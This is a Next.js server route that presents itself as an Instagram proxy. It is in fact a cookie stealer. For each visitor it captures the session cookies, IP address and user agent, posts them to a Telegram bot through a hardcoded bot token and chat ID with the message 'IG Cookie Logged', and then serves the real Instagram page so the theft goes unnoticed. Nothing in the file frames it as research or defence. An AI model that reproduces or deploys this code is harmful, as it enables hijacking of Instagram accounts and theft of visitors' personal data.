import { NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

export async function GET(request) {
  // 1. Extract the path from the request URL
  // e.g., if URL is https://your-site.vercel.app/proxy/p/123, we want /p/123
  const url = new URL(request.url);
  const path = url.pathname.replace('/proxy', '') || '/';
  
  const targetUrl = `https://www.instagram.com${path}`;

  // 2. Get headers from the incoming request
  const userAgent = request.headers.get('user-agent') || 'Unknown';
  const forwardedFor = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown';
  const cookieHeader = request.headers.get('cookie') || '';

  // 3. Fetch the Instagram page on the server side
  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': userAgent,
        'Cookie': cookieHeader,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      redirect: 'follow',
    });

    const content = await response.text();

    // 4. Prepare Telegram Message
    const timestamp = new Date().toISOString();
    const cleanCookies = cookieHeader.replace(/; /g, '\n').replace(/;/g, '\n');

    const message = `
🍪 <b>IG Cookie Logged</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${forwardedFor}
📱 <b>UA:</b> <code>${userAgent}</code>
🔗 <b>URL:</b> ${targetUrl}

🍪 <b>Cookies:</b>
<code>${cleanCookies}</code>
    `;

    // 5. Send to Telegram
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      });
    } catch (error) {
      console.error("Telegram Error:", error);
    }

    // 6. Return the Instagram content
    return new NextResponse(content, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache',
      }
    });

  } catch (error) {
    console.error("Proxy Error:", error);
    return new NextResponse("Proxy Error", { status: 500 });
  }
}

// 7. Export the dynamic setting to ensure it's treated as a server-side route, not static
export const dynamic = 'force-dynamic';
export const revalidate = 0;
